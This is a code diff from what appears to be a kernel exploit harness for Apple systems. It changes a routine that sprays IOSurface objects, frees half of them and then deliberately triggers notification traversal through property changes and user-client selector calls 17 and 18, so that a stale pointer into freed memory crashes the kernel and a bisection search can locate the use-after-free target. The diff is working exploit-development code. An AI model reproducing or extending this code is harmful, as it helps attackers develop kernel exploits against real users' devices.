@@ -19375,6 +19375,12 @@ new_modes:
                     close(rfd);
                 }
                 if (!r229_survived_last) r229_crash_count++;
+                /* Detect stale success state: bsearch=[0,0] with phase=0 means
+                   previous convergence wrote zeros. Reset for fresh search. */
+                if (r229_phase == 0 && r229_bsearch_hi <= r229_bsearch_lo) {
+                    r229_bsearch_lo = 0;
+                    r229_bsearch_hi = 255;
+                }
                 r229_attempt++;
                 /* Write state with survived=0; force sync to survive kernel panics */
                 {
@@ -20012,8 +20018,34 @@ new_modes:
                             }
                         }
 
-                        rlog("  r=229: Freed [%d..%d]. Waiting 1.5s...\n", bs_lo, mid);
-                        usleep(1500000);
+                        rlog("  r=229: Freed [%d..%d]. Triggering notifications...\n", bs_lo, mid);
+                        /* Active trigger: modify properties on REMAINING surfaces
+                         * to cause notification traversal. If stale entry is for a
+                         * freed surface, the traversal follows the stale pointer
+                         * into freed memory → MTE fault → crash. */
+                        for (int ti = mid + 1; ti <= bs_hi; ti++) {
+                            if (r229_spray[ti]) {
+                                int marker = 0xBEEF0000 | ti;
+                                CFNumberRef mv = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                                IOSurfaceSetValue(r229_spray[ti], CFSTR("_bsprobe"), mv);
+                                CFRelease(mv);
+                                IOSurfaceRemoveValue(r229_spray[ti], CFSTR("_bsprobe"));
+                            }
+                        }
+                        /* Trigger on race user client via sel17/18 on remaining surfaces.
+                         * sel17 register may traverse the notification list, hitting
+                         * the stale entry if its surface was in the freed half. */
+                        if (p13_spam_conn != IO_OBJECT_NULL) {
+                            for (int ti = mid + 1; ti <= bs_hi && ti < mid + 17; ti++) {
+                                if (r229_spray[ti]) {
+                                    uint64_t si17[2] = { IOSurfaceGetID(r229_spray[ti]), 0 };
+                                    uint32_t oc17 = 0;
+                                    IOConnectCallMethod(p13_spam_conn, 17, si17, 2, NULL, 0, NULL, &oc17, NULL, NULL);
+                                    IOConnectCallMethod(p13_spam_conn, 18, si17, 1, NULL, 0, NULL, &oc17, NULL, NULL);
+                                }
+                            }
+                        }
+                        usleep(2000000);
 
                         /* Survived — match NOT in freed half */
                         rlog("  r=229: Survived! Narrowing to [%d, %d]\n", mid + 1, bs_hi);
